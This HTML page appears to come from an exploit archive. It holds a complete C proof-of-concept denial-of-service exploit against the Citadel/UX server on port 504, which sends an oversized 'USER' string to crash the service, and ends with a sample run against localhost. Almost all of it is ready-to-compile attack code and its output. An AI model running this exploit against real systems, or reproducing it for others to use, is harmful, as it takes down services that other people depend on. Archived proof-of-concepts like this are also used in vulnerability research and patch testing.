<html>
<head>
<title>Citadel/UX Remote Denial of Service Exploit (PoC)</title>
<pre>
/* citadel_dos.c
*
* Citadel/UX Remote DoS exploit (Proof of Concept)
*
* Tested in Slackware 9.0.0 / 9.1.0 / 10.0.0
*
* by CoKi &lt;coki@nosystem.com.ar&gt;
* No System Group - http://www.nosystem.com.ar
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;string.h&gt;
#include &lt;getopt.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/fcntl.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/socket.h&gt;

#define BUFFERSIZE 96+1
#define ERROR -1
#define TIMEOUT 3
#define PORT 504

int connect_timeout(int sfd, struct sockaddr *serv_addr,
socklen_t addrlen, int timeout);
void use(char *program);

int main(int argc, char *argv[]) {
char buffer[BUFFERSIZE], *p, temp[BUFFERSIZE];
int sockfd;
struct hostent *he;
struct sockaddr_in dest_dir;

if(argc != 2) use(argv[0]);

p = buffer;

printf(&quot;\n Citadel/UX Remote DoS exploit (Proof of Concept)\n&quot;);
printf(&quot; by CoKi &lt;coki@nosystem.com.ar&gt;\n\n&quot;);

memset(p, 'A', 96);
p += 92;
*p = '\0';

printf(&quot; [+] verifying host:\t&quot;);
fflush(stdout);

if((he=gethostbyname(argv[1])) == NULL) {
herror(&quot;Error&quot;);
printf(&quot;\n&quot;);
exit(1);
}

printf(&quot;OK\n&quot;);

if((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == ERROR) {
perror(&quot;Error&quot;);
printf(&quot;\n&quot;);
exit(1);
}

dest_dir.sin_family = AF_INET;
dest_dir.sin_port = htons(PORT);
dest_dir.sin_addr = *((struct in_addr *)he-&gt;h_addr);
bzero(&amp;(dest_dir.sin_zero), 8);

printf(&quot; [+] conecting...\t&quot;);
fflush(stdout);

if(connect_timeout(sockfd, (struct sockaddr *)&amp;dest_dir,
sizeof(struct sockaddr), TIMEOUT) == ERROR) {

printf(&quot;Closed\n\n&quot;);
exit(1);
}

printf(&quot;OK\n&quot;);

printf(&quot; [+] sending exploit...\t&quot;);
fflush(stdout);

recv(sockfd, temp, sizeof(temp), 0);
send(sockfd, &quot;USER &quot;, 5, 0);
send(sockfd, buffer, strlen(buffer), 0);
send(sockfd, &quot;\n&quot;, 1, 0);
close(sockfd);

printf(&quot;OK\n\n&quot;);
}

int connect_timeout(int sfd, struct sockaddr *serv_addr,
socklen_t addrlen, int timeout) {

int res, slen, flags;
struct timeval tv;
struct sockaddr_in addr;
fd_set rdf, wrf;

fcntl(sfd, F_SETFL, O_NONBLOCK);

res = connect(sfd, serv_addr, addrlen);

if (res &gt;= 0) return res;

FD_ZERO(&amp;rdf);
FD_ZERO(&amp;wrf);

FD_SET(sfd, &amp;rdf);
FD_SET(sfd, &amp;wrf);
bzero(&amp;tv, sizeof(tv));
tv.tv_sec = timeout;

if (select(sfd + 1, &amp;rdf, &amp;wrf, 0, &amp;tv) &lt;= 0)
return -1;

if (FD_ISSET(sfd, &amp;wrf) || FD_ISSET(sfd, &amp;rdf)) {
slen = sizeof(addr);
if (getpeername(sfd, (struct sockaddr*)&amp;addr, &amp;slen) == -1)
return -1;

flags = fcntl(sfd, F_GETFL, NULL);
fcntl(sfd, F_SETFL, flags &amp; ~O_NONBLOCK);

return 0;
}

return -1;
}

void use(char *program) {
printf(&quot;Use: %s &lt;host&gt;\n&quot;, program);
exit(1);
}
---------------------------------- End Code: citadel_dos.c ----------------------------------

Compiling and running in the following manner:
coki@servidor:~$ make citadel_dos
coki@servidor:~$ ./citadel_dos localhost

Citadel/UX Remote DoS exploit (Proof of Concept)
by CoKi 

[+] verifying host: OK
[+] conecting... OK
[+] sending exploit... OK

coki@servidor:~$ 

// milw0rm.com [2004-08-02]
</pre>
</html>

